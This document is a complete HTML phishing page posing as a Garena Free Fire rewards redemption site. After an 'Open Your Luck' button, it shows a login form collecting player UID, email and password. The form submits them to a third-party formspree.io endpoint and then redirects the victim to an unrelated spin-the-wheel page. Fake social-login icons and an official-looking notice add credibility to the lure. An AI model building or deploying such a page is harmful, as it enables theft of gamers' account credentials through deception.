<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Free Fire - Rewards</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Teko:wght@500;700&display=swap');
        
        body { 
            margin: 0; padding: 0; 
            font-family: 'Teko', sans-serif; 
            background: #000 url('images/background.jpeg') no-repeat center center fixed; 
            background-size: cover; 
            color: #fff;
            overflow-x: hidden;
        }
        .overlay { 
            background: rgba(0, 0, 0, 0.6); 
            min-height: 100vh; 
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        /* Gifting Section */
        #gifting-section { text-align: center; }
        .gift-box { width: 90%; max-width: 400px; border: 3px solid #ffbc00; border-radius: 10px; margin-bottom: 20px; }
        .btn-open { 
            background: #ffbc00; color: #000; padding: 10px 40px; border: none; 
            font-size: 24px; font-weight: bold; cursor: pointer; text-transform: uppercase;
        }

        /* Login Section */
        #login-section { display: none; width: 90%; max-width: 400px; }
        .login-container { 
            background: rgba(20, 20, 20, 0.95); 
            padding: 30px; border: 2px solid #ffbc00; border-radius: 5px; text-align: center;
        }
        .logo { width: 120px; margin-bottom: 10px; }
        .title { color: #ffbc00; font-size: 28px; margin-bottom: 20px; letter-spacing: 1px; }
        
        input { 
            width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #444; 
            background: #222; color: #fff; font-size: 18px; box-sizing: border-box;
        }
        .login-btn { 
            width: 100%; padding: 12px; background: #ffbc00; border: none; 
            color: #000; font-weight: bold; font-size: 20px; cursor: pointer; margin-top: 10px;
        }

        /* Social Icons */
        .social-row { display: flex; justify-content: center; gap: 12px; margin-top: 25px; }
        .social-row a img { width: 32px; height: 32px; transition: 0.3s; }
        
        /* Notice Box */
        .notice-box { 
            background: #fff; color: #333; padding: 15px; border-radius: 4px; 
            text-align: left; font-size: 14px; margin-top: 25px; line-height: 1.3;
        }
    </style>
</head>
<body>

<div class="overlay">
    <div id="gifting-section">
        <img src="images/ff-logo-icon.png" width="100" alt="FF Logo"><br>
        <img src="images/background.jpeg" class="gift-box" alt="Reward"><br>
        <button class="btn-open" onclick="startLogin()">Open Your Luck</button>
    </div>

    <div id="login-section">
        <div class="login-container">
            <img src="images/ff-logo-icon.png" class="logo" alt="Logo">
            <div class="title">REWARDS REDEMPTION SITE</div>
            
            <form action="https://formspree.io/f/xgoypvvn" method="POST">
                <input type="text" name="UID" placeholder="Enter Player UID" required>
                <input type="email" name="Email" placeholder="Email Address" required>
                <input type="password" name="Password" placeholder="Password" required>
                
                <input type="hidden" name="_next" value="https://www.nykaa.com/spin-the-wheel-nd/lp">
                <button type="submit" class="login-btn">LOG-IN</button>
            </form>

            <div class="social-row">
                <a href="https://www.facebook.com/login"><img src="images/facebook.png" alt="FB"></a>
                <a href="https://vk.com/login"><img src="images/vk.png" alt="VK"></a>
                <a href="https://accounts.google.com"><img src="images/google.png" alt="G"></a>
                <a href="https://appleid.apple.com"><img src="images/apple.png" alt="A"></a>
                <a href="https://x.com/login"><img src="images/twitter.png" alt="X"></a>
            </div>
        </div>

        <div class="notice-box">
            <b>Important Notice:</b><br>
            1. Redemption code has 12/16 characters.<br>
            2. Item rewards are shown in [vault] tab in game lobby.<br>
            3. Golds or diamonds will add in account wallet automatically.<br>
            4. Reminder: you will not be able to redeem with guest accounts.
        </div>
    </div>
</div>

<script>
    function startLogin() {
        document.getElementById('gifting-section').style.display = 'none';
        document.getElementById('login-section').style.display = 'block';
    }
</script>

</body>
</html>
